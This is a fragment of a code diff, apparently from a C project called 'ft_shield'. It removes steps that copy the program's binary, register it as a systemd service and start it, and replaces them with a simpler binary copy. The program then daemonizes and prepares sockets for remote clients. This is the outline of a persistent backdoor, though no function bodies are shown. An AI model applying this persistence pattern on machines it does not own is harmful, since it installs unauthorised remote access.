@@ -92,17 +92,8 @@ int main(void)
     //     exit(EXIT_FAILURE);
     // }
 
-    const char *source_path = "/bin";
-    const char *binary_path = "/Users/yismaili/Desktop/ft_shield";
-    const char *service_name = "ft_shield";
+   copy_binary_file(SOURCE_FILE, DEST_FILE);
 
-    copy_binary(source_path, binary_path);
-
-    // Create the systemd service file
-    create_systemd_service(service_name, binary_path);
-
-    // Enable and start the systemd service
-    enable_and_start_service(service_name);
     create_daemon();
     // Init client socket array
     for (i = 0; i < MAX_CLIENTS; i++)
